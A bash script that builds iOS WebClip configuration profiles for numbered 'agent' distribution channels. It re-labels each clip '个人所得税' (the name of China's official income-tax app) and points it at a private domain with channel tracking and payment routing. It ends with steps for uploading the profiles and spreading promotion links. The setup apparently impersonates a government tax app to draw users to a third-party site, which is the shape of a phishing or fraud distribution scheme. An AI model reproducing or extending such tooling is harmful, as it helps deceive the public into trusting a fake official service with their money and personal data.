#!/usr/bin/env bash
# 生成代理渠道专用 iOS WebClip 描述文件：WebClip URL 带 ?ch=<渠道ID>
# 用法：./scripts/build-agent-mobileconfig.sh <渠道ID>
# 示例：./scripts/build-agent-mobileconfig.sh quan_c
# 可选环境变量：APP_URL / PUBLIC_SITE_URL（默认读仓库 .env）
set -euo pipefail

CHANNEL="${1:-}"
if [[ -z "$CHANNEL" ]]; then
  echo "用法: $0 <agent_channel_id>" >&2
  echo "示例: $0 quan_c" >&2
  exit 1
fi

if ! [[ "$CHANNEL" =~ ^[a-zA-Z0-9_-]{1,64}$ ]]; then
  echo "渠道 ID 无效（仅允许字母、数字、下划线、连字符，最长 64 字符）" >&2
  exit 1
fi

CHANNEL_LOWER="$(echo "$CHANNEL" | tr '[:upper:]' '[:lower:]')"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SRC="${ROOT}/个人.mobileconfig"
OUT_DIR="${ROOT}/dist/agent-ios"
OUT_FILE="${OUT_DIR}/app-agent-${CHANNEL_LOWER}.mobileconfig"

if [[ -f "${ROOT}/.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "${ROOT}/.env"
  set +a
fi

APP_URL="${APP_URL:-${HTTPS_APP_URL:-${PUBLIC_SITE_URL:-}}}"
if [[ -z "${APP_URL}" ]]; then
  APP_URL="https://lkj.qiyun888.top"
fi
APP_URL="${APP_URL%/}"

# WebClip 入口：与 Android 壳一致，带 in_app + ch，便于归因与支付分流
WEBCLIP_URL="${APP_URL}/mine.html?in_app=1&ch=${CHANNEL_LOWER}"

if [[ ! -f "$SRC" ]]; then
  echo "[mobileconfig] missing: $SRC" >&2
  exit 1
fi

mkdir -p "$OUT_DIR"
TMP_PLIST="$(mktemp)"
cleanup() { rm -f "$TMP_PLIST"; }
trap cleanup EXIT

if head -c 5 "$SRC" | grep -q '<?xml'; then
  cp -f "$SRC" "$TMP_PLIST"
else
  openssl smime -verify -noverify -inform DER -in "$SRC" -out "$TMP_PLIST" >/dev/null 2>&1
fi

python3 - "$TMP_PLIST" "$WEBCLIP_URL" "$CHANNEL_LOWER" "$OUT_FILE" <<'PY'
import plistlib, sys, uuid
src, url, channel, out_path = sys.argv[1:5]
pl = plistlib.load(open(src, "rb"))
wc = pl["PayloadContent"][0]
old = wc.get("URL", "")
wc["URL"] = url
# 区分渠道描述文件，避免与通用包 PayloadIdentifier 冲突
suffix = channel.replace("_", "-")[:40]
pl["PayloadDisplayName"] = "个人所得税·" + channel
pl["PayloadIdentifier"] = "com.taxplatform.agent." + suffix
pl["PayloadUUID"] = str(uuid.uuid4()).upper()
wc["PayloadDisplayName"] = "个人所得税"
wc["PayloadDescription"] = "渠道 " + channel
wc["Label"] = "个人所得税"
wc["PayloadIdentifier"] = "com.taxplatform.agent.webclip." + suffix
wc["PayloadUUID"] = str(uuid.uuid4()).upper()
with open(out_path, "wb") as f:
    plistlib.dump(pl, f, fmt=plistlib.FMT_XML)
print(f"[mobileconfig] URL {old!r} -> {url!r}")
print(f"[mobileconfig] wrote {out_path}")
PY

echo ""
echo "代理专用 iOS 描述文件已生成:"
echo "  $OUT_FILE"
echo ""
echo "下一步："
echo "  1. 在管理后台「安装分发 → 代理专属渠道」为渠道 ${CHANNEL_LOWER} 上传此文件"
echo "  2. 或设置 ios_mobileconfig_url 为 uploads/... 路径"
echo "  3. 推广链接：install_guide.html?ch=${CHANNEL_LOWER}"
